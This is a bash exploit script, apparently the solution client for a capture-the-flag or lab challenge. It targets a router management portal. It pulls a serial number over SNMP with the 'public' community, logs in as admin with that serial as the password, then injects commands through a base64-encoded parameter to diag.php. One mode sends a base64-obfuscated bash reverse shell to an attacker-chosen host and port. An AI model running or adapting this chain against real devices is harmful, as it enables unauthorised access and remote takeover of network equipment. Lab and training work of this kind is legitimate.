#!/usr/bin/env bash
# External Carrier-style assessment client. Run on Kali, never on the challenge VM.
set -euo pipefail

usage(){
  cat <<'EOF'
Usage:
  ./Red-Team-Attack-Script.sh TARGET_IP HTTP_PORT SNMP_PORT probe
  ./Red-Team-Attack-Script.sh TARGET_IP HTTP_PORT SNMP_PORT command 'COMMAND'
  ./Red-Team-Attack-Script.sh TARGET_IP HTTP_PORT SNMP_PORT reverse LHOST LPORT

Modes:
  probe    Prove authenticated diagnostic command injection with id/hostname.
  command  Execute one supplied command through the vulnerable diagnostic transport.
  reverse  Trigger a reverse shell. Start a listener on LHOST:LPORT first.

Use LHOST=auto to derive the Kali source address selected for TARGET_IP.
EOF
}
[[ $# -ge 4 ]] || { usage; exit 2; }
TARGET_IP="$1"; HTTP_PORT="$2"; SNMP_PORT="$3"; MODE="$4"; shift 4
[[ "$HTTP_PORT" =~ ^[0-9]+$ && "$SNMP_PORT" =~ ^[0-9]+$ ]] || { echo "Ports must be numeric" >&2; exit 2; }
for tool in snmpwalk curl base64 ip; do command -v "$tool" >/dev/null || { echo "Missing tool: $tool" >&2; exit 3; }; done

COOKIE="$(mktemp)"
trap 'rm -f "$COOKIE"' EXIT
OID=".1.3.6.1.2.1.47.1.1.1.1.11"
SERIAL="$(
  snmpwalk -v1 -c public -t 3 -r 1 \
    "udp:${TARGET_IP}:${SNMP_PORT}" "$OID" 2>/dev/null \
    | sed -n 's/.*SN#\([^"]*\).*/\1/p' | head -n 1
)"
[[ -n "$SERIAL" ]] || { echo "Serial number was not returned by SNMP" >&2; exit 4; }
printf '[+] SNMP serial: %s\n' "$SERIAL"

curl -fsS -L --max-time 10 \
  -c "$COOKIE" -b "$COOKIE" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=$SERIAL" \
  "http://${TARGET_IP}:${HTTP_PORT}/index.php" \
  | grep -q "DakshinLink routing operations" \
  || { echo "Portal authentication failed" >&2; exit 5; }
echo "[+] Portal authentication succeeded"

case "$MODE" in
  probe)
    REMOTE_COMMAND=";id;hostname;vtysh -c 'show bgp ipv4 unicast summary'"
    ;;
  command)
    [[ $# -eq 1 ]] || { usage; exit 2; }
    REMOTE_COMMAND=";$1"
    ;;
  reverse)
    [[ $# -eq 2 ]] || { usage; exit 2; }
    LHOST="$1"; LPORT="$2"
    [[ "$LPORT" =~ ^[0-9]+$ ]] || { echo "LPORT must be numeric" >&2; exit 2; }
    if [[ "$LHOST" == auto ]]; then
      LHOST="$(ip -4 route get "$TARGET_IP" | awk '{for(i=1;i<=NF;i++)if($i=="src"){print $(i+1);exit}}')"
    fi
    [[ -n "$LHOST" ]] || { echo "Unable to determine LHOST" >&2; exit 6; }
    printf '[*] Listener must already be running: nc -lvnp %s\n' "$LPORT"
    SHELL_CODE="bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'"
    SHELL_B64="$(printf '%s' "$SHELL_CODE" | base64 -w 0)"
    REMOTE_COMMAND=";echo ${SHELL_B64}|base64 -d|bash"
    ;;
  *)
    usage
    exit 2
    ;;
esac

CHECK_B64="$(printf '%s' "$REMOTE_COMMAND" | base64 -w 0)"
if [[ "$MODE" == reverse ]]; then
  curl -sS --max-time 7 -b "$COOKIE" \
    --data-urlencode "check=$CHECK_B64" \
    "http://${TARGET_IP}:${HTTP_PORT}/diag.php" >/dev/null || true
  echo "[+] Reverse-shell diagnostic request sent"
else
  curl -fsS --max-time 20 -b "$COOKIE" \
    --data-urlencode "check=$CHECK_B64" \
    "http://${TARGET_IP}:${HTTP_PORT}/diag.php" \
    | sed -n '/<pre>/,/<\/pre>/p' \
    | sed -e 's/<[^>]*>//g' -e 's/&gt;/>/g' -e 's/&lt;/</g' -e 's/&amp;/\&/g'
fi
